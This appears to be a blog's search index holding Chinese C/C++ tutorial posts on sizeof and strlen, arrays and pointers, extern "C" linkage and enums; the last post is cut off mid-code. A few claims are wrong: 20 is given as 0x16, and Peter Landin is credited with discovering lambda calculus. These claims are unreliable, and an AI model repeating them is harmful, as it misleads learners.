<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sizeof、strlen、数组、字符串</title>
      <link href="/2024/08/27/twentyfive/"/>
      <url>/2024/08/27/twentyfive/</url>
      
        <content type="html"><![CDATA[<p>对于初学者来说，sizeof，strlen，数组，字符串整在一起是痛苦的，它总能在某些莫名其妙的时候整一个措手不及,本文看看它们在一起能挖什么坑。</p><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>在说明这些问题之前，先看一段代码，看看你是否都理解了。注：以下代码结果为编译为64位程序后运行结果。</p><pre class="line-numbers language-c++"><code class="language-c++">#include <stdio.h>#include <string.h>void testArr(const char str[]){    printf("%lu %lu\n", sizeof(str), strlen(str));}int main(){    /*test 0*/    char str[] = "hello";    printf("test0 %lu %lu\n\n", sizeof(str), strlen(str));    //6 5    /*test 1*/    char str1[8] = "hello";    printf("test1 %lu %lu\n\n", sizeof(str1), strlen(str1)); //8 5    /**test 2*/    char str2[] = {'h','e','l','l','o'};    printf("test2 %lu %lu\n\n", sizeof(str2), strlen(str2)); //5 10    /**test 3*/    char *str3 = "hello";    printf("test3 %lu %lu\n\n", sizeof(str3), strlen(str3)); //8 5    /*test 4*/    char str4[] = "hello";    testArr(str4);//8 5    /*test 5*/    char str5[] = "hell\0o";    printf("test5 %lu %lu\n", sizeof(str5), strlen(str5));      //7 4    /*test 6*/    char str6[10] = {0};    printf("test6 %lu %lu\n\n", sizeof(str6), strlen(str6)); //10 0    /*test 7*/    char str7[5] = "hello";    printf("test7 %lu %lu\n\n", sizeof(str7), strlen(str7)); //5 10    /*test 8*/    char str8[5] = {0};    strncpy(str8, "hello", 5);    printf("%s\n", str8);    //hellohello    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>特别注意观察test2和test7。<br>在解释这些测试之前，先复习一下<code>sizeof</code>，<code>strlen</code>以及数组的内容。</p><h1 id="sizeof"><a href="#sizeof" class="headerlink" title="sizeof"></a>sizeof</h1><p>首先需要明确的是，<code>sizeof</code>是操作符，即它并不是函数，它的作用对象是数据类型，因此，它作用于变量时，也是对其类型进行操作。得到的结果是该数据类型占用空间大小，即<code>size_t</code>类型。<br>例如：</p><pre class="line-numbers language-c++"><code class="language-c++">struct test{    int a;    char b;};sizeof(int);//得到4sizeof(test);//4字节对齐时，得到8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h1><p>strlen是函数<code>size_t strlen(const char *s)</code>;</p><pre class="line-numbers language-c++"><code class="language-c++">#include<stdio.h>#include<string.h>int main(){    char *p = "hello";    printf("%lu\n", strlen(p));//得到5    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里字符串hello的长度就是5，但是占用空间是多少呢？<code>sizeof(&quot;hello&quot;)</code>得到6。是6，而不是5。注：strlen的时间复杂度为O（N）。</p><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><p>字符串是以’\0’结尾的字符数组。</p><pre><code>char str[] = &quot;hello&quot;;printf(&quot;test0 %lu %lu\n\n&quot;, sizeof(str), strlen(str)); //6 5</code></pre><p>上面的初始化方法等价于下面的方式：</p><pre><code>char str[] = {&#39;h&#39;,&#39;e&#39;,&#39;l&#39;,&#39;l&#39;,&#39;o&#39;,&#39;\0&#39;};</code></pre><p>它实际上就是一个字符数组，只不过上面这种赋值方式会在末尾加上’\0’。既然如此，那么用<code>sizeof</code>求得占用空间大小也就很明显了是6。而<code>strlen</code>是遇到’\0’，就结束，因此其求得长度为5。</p><pre><code>/*test 1*/char str1[8] = &quot;hello&quot;;printf(&quot;test1 %lu %lu\n\n&quot;, sizeof(str1), strlen(str1)); //8 5</code></pre><p>test1类似，只不过它占用空间是8，而长度仍然是5。</p><pre><code>/**test 2*/char str2[] = {&#39;h&#39;,&#39;e&#39;,&#39;l&#39;,&#39;l&#39;,&#39;o&#39;};printf(&quot;test2 %lu %lu\n\n&quot;, sizeof(str2), strlen(str2)); //5 10</code></pre><p><code>sizeof</code>求str2的大小很明显是5，而为啥那么<code>strlen</code>得到的是10呢？还记得<code>strlen</code>的原则吗，遇到’\0’则结束，但是’\0’在哪里？至少我在str2中没有看到，所以你可能看到的结果是10，也可能是另外一个莫名其妙的值，甚至可能导致程序崩溃。</p><pre><code>/**test 3*/char *str3 = &quot;hello&quot;;//最后有一个”隐形“的&#39;\0&#39;printf(&quot;test3 %lu %lu\n\n&quot;, sizeof(str3), strlen(str3)); //8 5</code></pre><p>为什么前者是8？很显然，str3并不是一个数组，而是一个字符指针，既然是指针类型，自然占着指针的大小，而64位程序中，它的大小就是你看到的8。后者还是从str3指向的地址开始，直到遇到’\0’，即得到长度5。</p><pre><code>/*test 4*/char str4[] = &quot;hello&quot;;testArr(str4); //8 5</code></pre><pre><code>/*test 5*/char str5[] = &quot;hell\0o&quot;;printf(&quot;test5 %lu %lu\n&quot;, sizeof(str5), strlen(str5)); //7 4</code></pre><p>同理，str5的初始化等价于下面：</p><pre><code>char str5[] = {&#39;h&#39;,&#39;e&#39;.&#39;l&#39;,&#39;l&#39;,&#39;\0&#39;,&#39;o&#39;,&#39;\0&#39;};</code></pre><p>所以不用解释你也明白，<code>sizeof</code>得到的结果是7。而<code>strlen</code>遇到第一个’\0’就停止继续计算了，因此得到4。</p><pre><code>/*test 6*/char str6[10] = {0};printf(&quot;test6 %lu %lu\n\n&quot;, sizeof(str6), strlen(str6)); //10 0</code></pre><p>相信这个也好理解，占用空间10，但是由于都是0，因此<code>strlen</code>得到长度为0。</p><pre><code>/*test 7*/char str7[5] = &quot;hello&quot;;printf(&quot;test7 %lu %lu\n\n&quot;, sizeof(str7), strlen(str7)); //5 10</code></pre><p>这也是非常危险的，占用空间是5，它没有空间容纳最后的’\0’，因此导致<code>strlen</code>计算的结果和test2一样，可能会是任意值。</p><pre><code>/*test 8*/char str8[5] = {0};strncpy(str8, &quot;hello&quot;, 5);printf(&quot;%s\n&quot;, str8);    //hellohello</code></pre><p>这里在实际编程中最容易遇到的问题之一，数组大小为5，但是拷贝了5个字节大小的数据。如果你把它当成字符数组使用也没什么问题，但是由于它最后没有空间去容纳’\0’，因此你使用strlen，或者使用printf去打印的时候，可能发生难以预料的结果。所以你可能会在你的项目代码中看到类似这样的写法，将字符数组的最后一个位置赋值为0：<code>str8[4] = &#39;\0&#39;</code>;<br>    • sizeof计算类型占用空间大小，时间复杂度O(1)<br>    • sizeof计算大小时会考虑字节对齐<br>    • strlen计算字符串长度，时间复杂度O(N)<br>    • strlen作用对象是字符串以’\0’结尾<br>    • strlen遇到’\0’作罢，如果没有遇到，则不可预料<br>    • 格外小心数组作为参数<br>另外注意下面两种方式hello存储的区域不一致：</p><pre><code>char str[] = &quot;hello&quot;;char *str2 = &quot;hello&quot;;//存储在数据区，只读</code></pre>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二维数组</title>
      <link href="/2024/08/26/twentyfour/"/>
      <url>/2024/08/26/twentyfour/</url>
      
        <content type="html"><![CDATA[<h1 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h1><p>我们知道 C 语言没有真正意义上的二维数组。二维数组的实现，只是简单地通过“线性扩展”的方式进行。<br>如图所示，</p><pre><code>int b[4][5];</code></pre><p>就是定义 4 个元素，每个元素都是一个包含 5 个整型变量的一维数组。它在内存中依然是以线性的形式存储。</p><h2 id="关于数组的三个问题"><a href="#关于数组的三个问题" class="headerlink" title="关于数组的三个问题"></a>关于数组的三个问题</h2><p>假设我们定义了二维数组<code>array[4][5]</code>，为了方便理解，使用如下的形式进行表述。</p><h2 id="array-表示的是什么？"><a href="#array-表示的是什么？" class="headerlink" title="array 表示的是什么？"></a>array 表示的是什么？</h2><p>显然同一维数组一样， array 是整个二维数组的首地址；在一维数组中，数组名是数组中第一个元素的地址，但是在二维数组中，数组名是第一行元素的地址。其实这个也很好理解，可以将整个二维数组当作是一个一维数组，那么一维数组中的每一个元素就是 array 中的一行。<br>下面将通过代码的形式进行验证我们初始化了一个全为 0 的数组，首先打印出了整型在内存中的大小，之后打印出 array 的地址，和 array 的下一个位置的地址。如果 array 指向的是数组中的第一行，那么 array 将指向数组中的第二行，array 与 array 之间差就是 <code>5*sizeof(int)</code>，<br>也就是指针 array 的步长为 5 。执行上述代码可以得到如下的结果,整型在内存中的大小为 4 ，而 array + 1 与 array 的差正好是 20（0x16）。<br>所以很明显，array 确实是数组中第一行元素的指针。</p><h2 id="array-1-表示的是什么？"><a href="#array-1-表示的是什么？" class="headerlink" title="*(array + 1)表示的是什么？"></a><code>*(array + 1)</code>表示的是什么？</h2><p><code>*(array + 1)</code> 称为 <code>(array + 1)</code> 的解引用，也就是之前所讲的取值。我们可以从两个角度对他进行理解。首先从解引用的角度，从上面的分析可以知道，array 是数组中第一行元素的指针，也就是说 array 的地址是数组的首地址，步长是数组中每一行元素的总长度。<br>因此 array + 1 所表示的数组的第二行的指针，对它进行解引用，实际上就是对 array + 1所在的地址取值，很显然就是数组中第二行的第一个元素。但是一个更好的角度是从语法糖的角度进行考虑。语法糖（Syntactic sugar）是由 Peter J. Landin（和图灵一样的天才人物，是他最先发现了 Lambda 演算，由此而创立了函数式编程）<br>创造的一个词语，它意指那些没有给计算机语言添加新功能，而只是对人类来说更“甜蜜”的语法。语法糖往往给程序员提供了更实用的编码方式，有益于更好的编码风格，更易读。不过其并没有给语言添加什么新东西。<br>在 C 语言里用<code>a[n]</code> 表示 <code>*(a + n)</code>，用    <code>a[n][m]</code>表示 <code>*(*(a + n) + m)</code>,这就是语法糖的应用，因为在内部，编译器会自动将<code>a[n]</code>转换为 <code>*(a + n)</code>的形式实现。<br>同样我们之前学习过的 for 循环也是 while 循环的一种语法糖。因此 <code>*(array + 1) == array[1]</code>，而 array[1] 又可以看作是二维数组中第二行元素所组成的子数组的名字，也就是数组中第二行第一个元素的地址。我们可以通过实验的方式的进行验证<br>在上面的代码中，首先初始化了一个数组，数组中的元素是各不相同的，之后打印输出 <code>*(array + 1)</code>以及对应的语法糖 array[1]，然后打印出数组中 <code>array[1][0]</code>的地址，最后打印出对 array + 1 的双重解引用，如果 <code>*(array + 1)</code>是 <code>array[1]</code>（即数组中第二行中第一个元素的地址），那么 <code>**(array + 1)</code>将表示第二行第一元素的值。</p><h2 id="array-1-3-表示什么？"><a href="#array-1-3-表示什么？" class="headerlink" title="*(*(array + 1) + 3)表示什么？"></a><code>*(*(array + 1) + 3)</code>表示什么？</h2><p>根据刚刚所讲的语法糖，<code>*(array + 1) + 3</code>可以表示为下面的形式：由于 <code>*(array + 1)</code>是第二行第一个元素的地址，所以 <code>*(array + 1) + 3</code>是第二行第四个元素的地址，那么很明显 <code>*( *(array + 1) + 3)</code>表示第二行第四个元素的值。</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数组</title>
      <link href="/2024/08/14/twentythree/"/>
      <url>/2024/08/14/twentythree/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在C语言中，数组和指针似乎总是“暧昧不清”，有时候很容易把它们混淆。本文就来理一理数组和指针之间到底有哪些异同。</p><h1 id="数组回顾"><a href="#数组回顾" class="headerlink" title="数组回顾"></a>数组回顾</h1><p>在分析之前，我们不妨回顾一下数组的知识。数组是可以存储一个固定大小的相同类型元素的顺序集合。为了便于我们说明，假设有以下数组声明：</p><pre><code>int a[5];char b[] = &quot;hello&quot;;</code></pre><p>数组大小必须在编译期就作为一个常数确定下来。但C99中引入了变长数组，允许数组的维度是表达式 ，但在数组分配内存时，其表达式的值可以被求出。<br>数组下标运算实际上都是通过指针进行的，也就是说<code>a[4]</code>与<code>*(a+4)</code>是等价的，甚至你会发现和<code>4[a]</code>也是一样的。数组名一般代表了指向该数组下标为0的元素的指针，并且<code>printf(&quot;%s\n&quot;, b)</code>与<code>printf(&quot;%s\n&quot;, &amp;b[0])</code>等效。</p><h1 id="数组和指针不相等"><a href="#数组和指针不相等" class="headerlink" title="数组和指针不相等"></a>数组和指针不相等</h1><p>考虑下面的声明：</p><pre><code>int c[4]；    //假设int占4字节int *d;</code></pre><p>对于上面的声明，编译器会给c预留内存空间4*4字节，并且数组名代表着指向数组第一个元素的指针。但对于d，却只为指针本身保留了内存空间。所以此时有下面的操作：</p><pre><code>c[3];        //合法*(c+3);      //合法*d;          //不合法，d指向了内存中不确定位置c++；        //不合法，一维数组名是指针常量，常量不能被修改掉d++；        //可通过编译</code></pre><p>另外，下面的两种情况也是不一样的：</p><pre><code>char c[] = &quot;hello&quot;;char *d = &quot;hello&quot;;</code></pre><p>前者对字符数组c进行了初始化，后者将d指向了字符串常量。字符串常量存储在只读区，因此有下面的操作：</p><pre><code>c[0] = &#39;H&#39;;  //合法，可修改数组内容*d = &#39;H&#39;;    //不合法，字符串常量内容不可更改d[0] = &#39;H&#39;   //不合法</code></pre><h1 id="数组名的含义"><a href="#数组名的含义" class="headerlink" title="数组名的含义"></a>数组名的含义</h1><p>绝大多数情况，数组名都代表着指向该数组中下标为0的元素的指针，但是有例外：</p><pre><code>int e[4];    //假设int为4字节sizeof(e);</code></pre><p>上面的sizeof(e)的值并非4或8（指针占用空间），而是4*4 = 16。也就是说，当数组名被用作运算符sizeof的参数时，它的计算结果是整个数组的大小，而非第一个元素的指针大小。再来看下面这种情况：</p><pre><code>int temp[5];char *p = &amp;temp;char *q = temp;</code></pre><p>在这里，p和q的值是一样的，含义却不一样，前者是指向数组的指针，而后者是指向该数组中下标为0的元素的指针。因此p+1指向了temp的末尾，而q+1指向了temp的第2个元素。</p><h1 id="数组长度计算"><a href="#数组长度计算" class="headerlink" title="数组长度计算"></a>数组长度计算</h1><p>如何计算数组长度？考虑下面的代码：</p><pre><code>int f[] = {1,2,3,4,5,6};int *g = f;size_t len_f = sizeof(f)/sizeof(int)//正确计算方法size_t len_g = sizeof(g)/sizeof(int)</code></pre><p>上面的len_f和len_g的值相等吗？显然并不相等。事实上，只有len_f得到了数组f的长度，而len_g的值并没有任何实际意义。</p><h1 id="不能作为参数的数组"><a href="#不能作为参数的数组" class="headerlink" title="不能作为参数的数组"></a>不能作为参数的数组</h1><p>所谓的数组不能作为参数，并不是指声明的数组不能作为参数传递，而是指当数组名作为参数时，数组名会被转换为指向该数组下标为0的元素的指针。而下面的两种声明，其实也是等效的：</p><pre><code>size_t arrayLen(const int *arr);size_t arrayLen(const int arr[]);</code></pre><p>我们来看一个例子，说明数组作为参数的情况：</p><pre><code>#include &lt;stdio.h&gt;int arraySum(const int arr[]){    unsigned int loop = 0;    /*循环前计算好长度，提高性能*/    unsigned int len = sizeof(arr)/sizeof(int);    int sum = 0;    if(NULL == arr)    {        return 0;    }    for(loop = 0; loop &lt; len; loop++)    {        sum+=arr[loop];    }    return sum;}int main(){    int a[] = {1,2,3,4,5,6};    int sum = arraySum(a);    printf(&quot;arr sum is %d&quot;,sum);    return 0;}</code></pre><p>我们运行上面的程序，发现最终结果并不是我们预期的21，而是3。问题在于，a作为参数传入到arraySum中时，它是作为指针的，那么在函数内部计算sizeof(arr)自然只是得到了指针占用的内存大小。对于64位程序，这个大小是8，那么len的值为2，最终只计算了两个元素的和。</p><h2 id="思考：该如何修改上面的程序才能得到正确的结果？"><a href="#思考：该如何修改上面的程序才能得到正确的结果？" class="headerlink" title="思考：该如何修改上面的程序才能得到正确的结果？"></a>思考：该如何修改上面的程序才能得到正确的结果？</h2><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我们来总结一下前面的核心内容：<br>    • 数组下标运算实际上都是通过指针进行的。<br>    • 数组名代表着指向该数组中下标为0的元素的指针，但有例外：<code>sizeof(数组名)</code>返回整个数组的大小，而非指针大小；&amp;数组名返回一个指向数组的指针，而不是指向该数组中下标为0的元素的指针的指针。<br>    • 数组名作为参数时，数组名会被转换成指向该数组下标为0的元素的指针。<br>    • 指针操作可能比下标操作效率高，但可维护性却不一定有下标操作好。<br>    • 数组和指针不相等。</p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>下面的代码输出结果是什么？</p><pre><code>#include&lt;stdio.h&gt;int main(){    int a[5] = {1,2,3,4,5};    int *p = (int*)(&amp;a+1);    printf(&quot;%d,%d&quot;,*(a+1),*(p-1));    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>语言链接</title>
      <link href="/2024/08/14/twentytwo/"/>
      <url>/2024/08/14/twentytwo/</url>
      
        <content type="html"><![CDATA[<p>提供以不同程序语言编写的模块间的连接。</p><pre><code>extern 字符串字面量 { 声明序列(可选) }     (1)extern 字符串字面量 声明     (2)</code></pre><p>1) 将语言说明字符串字面量应用到声明于声明序列中的所有函数类型，具有外部连接的函数名，和具有外部连接的变量。<br>2) 将语言说明字符串字面量应用到单一声明或定义。<br>字符串字面量     -     所要求的语言连接的名字<br>声明序列     -     声明的序列，可以包含嵌套的连接说明<br>声明     -     一个声明<br>[编辑] 解释<br>所有函数类型，所有拥有外部连接的函数名，及所有拥有外部连接的变量名，拥有一种称作语言连接的性质。语言连接封装与以另一程序语言编写的模块进行连接的要求的集合：调用约定、名字重整的算法，等等。仅保证支持二种语言连接：<br>1) “C++”，默认的语言连接。<br>2) “C”，使得以 C 程序语言编写的函数进行连接，以及在 C++ 程序中定义能从C模块调用的函数成为可能。</p><pre><code>extern &quot;C&quot; {    int open(const char *pathname, int flags); // C 函数声明}int main(){    int fd = open(&quot;test.txt&quot;, 0); // 从 C++ 程序调用 C 函数}// 此 C++ 函数能从 C 代码调用extern &quot;C&quot; void handler(int) {    std::cout &lt;&lt; &quot;Callback invoked\n&quot;; // 它能使用 C++}</code></pre><p>因为语言连接是每个函数类型的一部分，故函数指针也要维持语言连接。函数类型的语言连接（它表示调用约定）和函数名的语言离近了（它表示名字重整）是彼此独立的：</p><pre><code>extern &quot;C&quot; void f1(void(*pf)()); // 声明一个具有 C 连接的函数 f1，                             // 它返回 void 并接受指向返回 void 且不接受形参的 C 函数的指针extern &quot;C&quot; typedef void FUNC(); // 声明 FUNC 为返回 void 且不接受形参的 C 函数类型FUNC f2;            // 名字 f2 拥有 C++ 连接，但其类型是 C 函数extern &quot;C&quot; FUNC f3; // 名字 f3 拥有 C 连接且其类型是 C 函数 void(void)void (*pf2)(FUNC*); // 名字 pf2 拥有 C++ 连接，且其类型是“指向返回 void 并接受                    // 一个‘指向返回 void 且不接受形参的 C 函数的指针’类型参数的 C++ 函数的指针extern &quot;C&quot; {    static void f4(); // 函数 f4 的名字拥有内部连接（无语言）                      // 但函数的类型拥有 C 语言连接}</code></pre><p>在同一命名空间中具有相同名字和相同形参列表的两个函数，不能拥有两个不同的语言连接（然而需要注意，形参的连接可容许这种重载，例如 std::qsort 和 std::bsearch 的情况）。类似地，同一命名空间中的两个变量不能拥有两种不同的语言连接。<br>[编辑] “C” 连接的特殊规则<br>1) 当类成员的声明和成员函数类型的声明出现于 “C” 语言块中时，其连接仍保持为 “C++”。<br>2) 当两个拥有同一无限定名字的函数声明于不同命名空间，且都拥有 “C” 语言连接时，两个声明表示同一函数。<br>3) 当两个拥有 “C” 语言连接和相同名字的变量出现于不同命名空间时，它们表示同一变量。<br>4) 一个 “C” 变量和一个 “C” 函数不能拥有相同的名字，无关乎它们定义于同一或不同命名空间。<br>语言连接只能出现在命名空间作用域。语言说明的花括号不建立作用域。当语言说明发生嵌套时，有效的是最内层的说明。函数可在带语言说明的声明之后，进行不带连接说明的重声明，第二个声明将重复使用首个声明的语言连接。反之则不行：若首个声明无语言连接，则假定其为 “C++”，而以其他语言连接重声明则是错误。<br>直接包含于语言连接说明之中的声明，被处理为如同它含有 extern 说明符，用以确定所声明的名字的连接以及它是否为定义。</p><pre><code>extern &quot;C&quot; int x; // 声明且非定义 // 上一行等价于 extern &quot;C&quot; { extern int x; }extern &quot;C&quot; { int x; } // 声明及定义extern &quot;C&quot; 使得在 C++ 程序中包含（include）含有 C 库函数的声明的头文件成为可能，但如果与 C 程序共用相同的头文件，必须以适当的 #ifdef 隐藏 extern &quot;C&quot;（其在 C 中不被允许），通常为 __cplusplus：#ifdef __cplusplusextern &quot;C&quot; int foo(int, int); // C++ 编译器所见#elseint foo(int, int);            // C 编译器所见#endif</code></pre>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>枚举申明</title>
      <link href="/2024/08/04/twentyone/"/>
      <url>/2024/08/04/twentyone/</url>
      
        <content type="html"><![CDATA[<p>枚举（enumeration）是独立的类型，其值限制在一个取值范围内（细节见下文），它可以包含数个明确命名的常量（“枚举项（enumerator）”）。<br>各常量的值是某个整型类型（称为该枚举的底层类型（underlying type））的值。枚举以下列语法定义：</p><pre><code>enum-关键词 attr(可选) enum-名(可选) enum-基(可选)(C++11) { 枚举项列表(可选) }     (1)enum-关键字 attr(可选) enum-名 enum-基(可选) ;     (2)     (C++11 起)</code></pre><p>1) enum-说明符，出现于声明语法的 声明说明符序列 ：定义枚举类型与其枚举项。<br>2) 不可见（opaque）枚举声明：定义枚举类型，但不定义其枚举项：在此声明后，该类型是完整类型，且其大小已知。<br>注意：仅有的在 enum-名 之前出现 嵌套名说明符 的情况，是类模板的有作用域枚举成员的显式特化声明 C++14 起。</p><pre><code>enum-关键字     -     enum、enum class(C++11 起) 或 enum struct(C++11 起) 之一attr(C++11)     -     任意数量的属性的可选序列enum-名     -     所声明的枚举的名字。若存在，且若此声明为重声明，则其之前可带有 嵌套名说明符(C++11 起)，</code></pre><p>即名字和作用域解析运算符 :: 的序列并以作用域解析运算符结尾。仅可在无作用域枚举声明中省略名字。enum-基C++11     -     冒号 (:)，后随指名某个整型类型的 类型说明符序列（若它为 cv 限定，则忽略其限定性），该类型将作为此枚举类型的固定底层类型<br>枚举项列表     -     枚举项定义的逗号分隔列表，每项要么是简单的 标识符，它成为枚举项之名，要么是带初始化器的标识符：标识符 = 常量表达式。任一情况下，标识符 可直接后随一个可选的属性说明符序列。C++17起有两种截然不同的枚举：无作用域枚举以 enum-关键词 enum 声明和有作用域枚举以 enum-关键词 enum class或 enum struct声明。</p><h1 id="无作用域枚举"><a href="#无作用域枚举" class="headerlink" title="无作用域枚举"></a>无作用域枚举</h1><pre><code>enum 名字 { 枚举项 = 常量表达式 , 枚举项 = 常量表达式 , ... }     (1)enum 名字 : 类型 { 枚举项 = 常量表达式 , 枚举项 = 常量表达式 , ... }     (2)     (C++11 起)enum 名字 : 类型 ;     (3)     (C++11 起)</code></pre><p>1) 声明无作用域枚举类型，其底层类型不固定（此情况中，底层类型是由实现定义的某个能表示所有枚举项值的整型类型；此类型不大于 int，除非枚举项的值不能放入 int 或 unsigned int。若枚举项列表为空，则底层类型为如同枚举拥有单个值为 0 的枚举项）。<br>2) 声明底层类型固定的无作用域枚举类型。<br>3) 无作用域枚举的不可见枚举声明必须指定底层类型。每个枚举项都成为该枚举类型即名字的一个具名常量，在其外围作用域可见，且可用于要求常量的任何位置。</p><pre><code>enum Color { red, green, blue };Color r = red;switch(r){    case red  : std::cout &lt;&lt; &quot;red\n&quot;;   break;    case green: std::cout &lt;&lt; &quot;green\n&quot;; break;    case blue : std::cout &lt;&lt; &quot;blue\n&quot;;  break;}</code></pre><p>每个枚举项都与一个底层类型的值相关联。当在 枚举项列表 中提供了初始化器时，各枚举项的值由那些初始化器所定义。若首个枚举项无初始化器，则其关联值为零。对于其他任何定义中无初始化器的枚举项，其关联值为前一枚举项加一。</p><pre><code>enum Foo { a, b, c = 10, d, e = 1, f, g = f + c };//a = 0, b = 1, c = 10, d = 11, e = 1, f = 2, g = 12</code></pre><p>无作用域枚举类型的值可隐式转换为整型类型。若底层类型不固定，则其值可转换到以下列表中首个能保有其整个值范围的类型：int、unsigned int、long、unsigned long、long long 或 unsigned long long。若底层类型固定，则其值可转换到其提升后的底层类型。</p><pre><code>enum color { red, yellow, green = 20, blue };color col = red;int n = blue; // n == 21</code></pre><p>整数、浮点和枚举类型的值，可用 static_cast 或显式转型转换到任何枚举类型。若底层类型不固定，且若源值在范围外（源值在范围内，若它能以足以保有目标枚举的所有枚举项的最小位域表示，这里若源值为浮点类型则首先转换到枚举的底层类型），则其结果未指明 C++17前未定义 C++17起。否则，结果与隐式转换到底层类型的结果相同。<br>注意，这种转换后的值不必等于任何为该枚举所定义的具名枚举项。</p><pre><code>enum access_t { read = 1, write = 2, exec = 4 }; //枚举项：1、2、4 范围：0..7access_t rwe = static_cast&lt;access_t&gt;(7);assert((rwe &amp; read) &amp;&amp; (rwe &amp; write) &amp;&amp; (rwe &amp; exec));access_t x = static_cast&lt;access_t&gt;(8.0); // C++17 起为未定义行为access_t y = static_cast&lt;access_t&gt;(8); // C++17 起为未定义行为enum foo { a = 0, b = UINT_MAX }; // 范围：[0, UINT_MAX]foo x= foo(-1); // C++17 起为未定义行为，即使 foo 的底层类型为 unsigned int</code></pre><p>无作用域枚举的 名字 可以忽略：这种声明仅将各枚举项引入到其外围作用域中：</p><pre><code>enum { a, b, c = 0, d = a + 2 }; // 定义 a = 0, b = 1, c = 0, d = 2</code></pre><p>当无作用域枚举是类成员时，其枚举项可用类成员访问运算符 . 和 -&gt; 访问：</p><pre><code>struct X{    enum direction { left = &#39;l&#39;, right = &#39;r&#39; };};X x;X* p = &amp;x;int a = X::direction::left; // 仅于 C++11 及之后允许int b = X::left;int c = x.left;int d = p-&gt;left;</code></pre><h1 id="有作用域枚举-C-11起"><a href="#有作用域枚举-C-11起" class="headerlink" title="有作用域枚举 C++11起"></a>有作用域枚举 C++11起</h1><pre><code>enum struct|class 名字 { 枚举项 = 常量表达式 , 枚举项 = 常量表达式 , ... }enum struct|class 名字 : 类型 { 枚举项 = 常量表达式 , 枚举项 = 常量表达式 , ... }enum struct|class 名字 ;enum struct|class 名字 : 类型 ;</code></pre><p>1) 声明底层类型为 int 的有作用域枚举类型（关键词 class 与 struct 完全等价）<br>2) 声明底层类型为 类型 的有作用域枚举类型<br>3) 底层类型为 int 的有作用域枚举类型的不可见枚举声明<br>4) 底层类型为 类型 的有作用域枚举类型的不可见枚举声明<br>每个 枚举项 都成为该枚举的类型即名字的具名常量，它为该枚举的作用域所包含，且可用作用域解析运算符访问。没有从有作用域枚举项到整数类型的隐式转换，尽管 static_cast 可用于获得枚举项的数值。</p><pre><code>enum class Color { red, green = 20, blue };Color r = Color::blue;switch(r){    case Color::red  : std::cout &lt;&lt; &quot;red\n&quot;;   break;    case Color::green: std::cout &lt;&lt; &quot;green\n&quot;; break;    case Color::blue : std::cout &lt;&lt; &quot;blue\n&quot;;  break;}// int n = r; // 错误：不存在从有作用域枚举到 int 的转换int n = static_cast&lt;int&gt;(r); // OK, n = 21</code></pre><p>底层类型固定的有作用域枚举类型和无作用域枚举类型，若下列全部条件为真，则都能用列表初始化从一个整数初始化而无需转型：     (C++17 起)<br>        • 初始化是直接列表初始化<br>        • 初始化器列表仅有单个元素<br>        • 枚举是底层类型固定的有作用域枚举或无作用域枚举<br>        • 转换为非窄化转换<br>这使得我们能引入新的整数类型（例如 SafeInt）并享受与其底层整数类型相同的既存调用约定，即使在不利于以值传递/返回结构体的 ABI 上也是如此。</p><pre><code>enum byte : unsigned char {}; // byte 是新的整数类型byte b { 42 }; // C++17 起 OK（直接列表初始化）byte c = { 42 }; // 错误byte d = byte{ 42 }; // C++17 起 OK；与 b 的值相同byte e { -1 }; // 错误struct A { byte b; };A a1 = { { 42 } }; // 错误A a2 = { byte{ 42 } }; // C++17 起 OKvoid f(byte);f({ 42 }); // 错误enum class Handle : std::uint32_t { Invalid = 0 };Handle h { 42 }; // C++17 起 OK</code></pre><p>示例</p><pre><code>#include &lt;iostream&gt;// 采用 16 位的 enumenum smallenum: int16_t{    a,    b,    c};// color 可为 red（值 0）、yellow（值 1）、green（值 20）或 blue（值 21）enum color{    red,    yellow,    green = 20,    blue};// altitude 可为 altitude::high 或 altitude::lowenum class altitude: char{     high=&#39;h&#39;,     low=&#39;l&#39;, // C++11 允许尾随逗号};// 常量 d 为 0，常量 e 为 1，常量 f 为 3enum{    d,    e,    f = e + 2};// 枚举类型（有作用域和无作用域）能拥有重载的运算符std::ostream&amp; operator&lt;&lt;(std::ostream&amp; os, color c){    switch(c)    {        case red   : os &lt;&lt; &quot;red&quot;;    break;        case yellow: os &lt;&lt; &quot;yellow&quot;; break;        case green : os &lt;&lt; &quot;green&quot;;  break;        case blue  : os &lt;&lt; &quot;blue&quot;;   break;        default    : os.setstate(std::ios_base::failbit);    }    return os;}std::ostream&amp; operator&lt;&lt;(std::ostream&amp; os, altitude al){    return os &lt;&lt; static_cast&lt;char&gt;(al);}int main(){    color col = red;    altitude a;    a = altitude::low;    std::cout &lt;&lt; &quot;col = 